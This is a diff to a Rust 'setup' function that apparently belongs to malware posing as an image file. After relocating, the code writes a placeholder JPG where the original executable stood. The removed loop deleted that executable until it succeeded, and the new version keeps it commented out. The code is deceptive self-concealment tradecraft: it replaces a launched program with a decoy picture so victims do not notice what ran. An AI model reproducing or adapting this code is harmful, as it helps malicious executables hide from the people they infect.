@@ -73,6 +73,7 @@ pub fn setup() -> Result<()> {
   use rand::Rng;
   use rand::{distributions::Alphanumeric, thread_rng};
   use std::{
+    env, fs,
     process::{exit, Command},
     thread,
     time::Duration,
@@ -85,24 +86,25 @@ pub fn setup() -> Result<()> {
   let token: String = thread_rng().sample_iter(&Alphanumeric).take(32).collect();
 
   if current_path == target_path {
-    loop {
-      let conf = get_app_config()?;
-      let mut new_path = conf.original_path.clone().replace(".exe", "");
+    let conf = get_app_config()?;
+    let mut new_path = conf.original_path.clone().replace(".exe", "");
 
-      if !new_path.ends_with(".jpg") {
-        new_path.push_str(".jpg");
-      }
-
-      fs::write(&new_path, PLACEHOLDER_BUF)?;
-
-      match fs::remove_file(&conf.original_path) {
-        Ok(_) => break,
-        Err(_) => {
-          thread::sleep(Duration::from_millis(10));
-          continue;
-        }
-      }
+    if !new_path.ends_with(".jpg") {
+      new_path.push_str(".jpg");
     }
+
+    fs::write(&new_path, PLACEHOLDER_BUF)?;
+
+    // loop {
+    //   match fs::remove_file(&conf.original_path) {
+    //     Ok(_) => break,
+    //     Err(_) => {
+    //       thread::sleep(Duration::from_millis(10));
+    //       continue;
+    //     }
+    //   }
+    // }
+
     return Ok(());
   }
 
